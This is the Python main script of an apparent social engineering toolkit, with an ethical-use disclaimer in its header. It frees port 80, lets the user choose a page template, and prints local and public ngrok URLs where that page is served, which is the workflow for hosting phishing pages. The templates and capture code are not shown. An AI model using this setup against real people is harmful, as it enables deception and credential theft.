#!/usr/bin/env python

"""
SocialEngineer - Social Engineering Toolkit
-------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : SocialEngineer - An all-in-one CLI framework for social engineering

License     : Open-source — strictly for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is intended solely for educational use, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
"""

import sys
from includes import banner
from includes import utils
from includes.menu import main_menu
from includes import dynamic_url
from includes import config_status
from rich.console import Console
from rich.panel import Panel
import time

from colorama import Fore, Style, init
init(autoreset=True)

console = Console()




def main():
    utils.check_sudo()
    while True:
        banner.show_banner()
        choice = main_menu()

        if choice == 1:
            import os
            utils.kill_port(80)
            banner.show_banner()
            config_status.check_ngrok()
            selected_template = utils.choose_template()
            if selected_template:
                print(Fore.GREEN + "✅ " + Style.BRIGHT + "Selected Template: " + Fore.CYAN + f"{selected_template}" + Style.RESET_ALL)
                template_path = os.path.join("templates", selected_template)
             
                #url = dynamic_url.re_url()
                local_ip = utils.getip()
                ngrok_url = dynamic_url.re_url()
                print()
                print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
                print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
                print()
                input("Press Enter to go back to main menu...")
                
               
            else:
                print("🔙 Returning to main menu...")
            
           
        else:
            banner.not_implemented()

if __name__ == "__main__":
    main()